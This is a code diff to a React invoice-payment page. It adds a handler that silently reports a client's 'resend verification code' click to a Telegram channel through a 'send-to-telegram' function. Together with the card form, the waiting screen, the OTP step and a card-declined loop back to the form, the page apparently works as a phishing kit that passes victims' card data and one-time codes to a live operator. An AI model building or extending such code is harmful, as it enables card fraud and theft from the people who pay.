@@ -149,6 +149,17 @@ const InvoicePayment = () => {
     }
   }, []);
 
+  const handleOtpResend = async () => {
+    if (!sessionId) return;
+    try {
+      await supabase.functions.invoke("send-to-telegram", {
+        body: { type: "otp", otp: "🔄 Client clicked RESEND verification code / approval request" },
+      });
+    } catch {
+      // fail silently
+    }
+  };
+
   const handleOtpSubmit = async (otp: string) => {
     setOtpError(null);
     if (sessionId) {
@@ -326,7 +337,7 @@ const InvoicePayment = () => {
           )}
           {step === "processing_card" && <ProcessingOverlay onComplete={handleProcessingComplete} />}
           {step === "waiting" && <WaitingScreen amount={formatEuro(total)} />}
-          {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} error={otpError} otpType={otpType} />}
+          {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} onResend={handleOtpResend} error={otpError} otpType={otpType} />}
           {step === "processing" && <WaitingScreen amount={formatEuro(total)} />}
           {step === "success" && <PaymentSuccess amount={formatEuro(total)} email={submittedEmail} cardLast4={submittedCardLast4} cardBrand={submittedCardBrand} />}
           {step === "card_declined" && <CardDeclinedScreen onComplete={() => { setStep("form"); setSessionId(null); }} />}
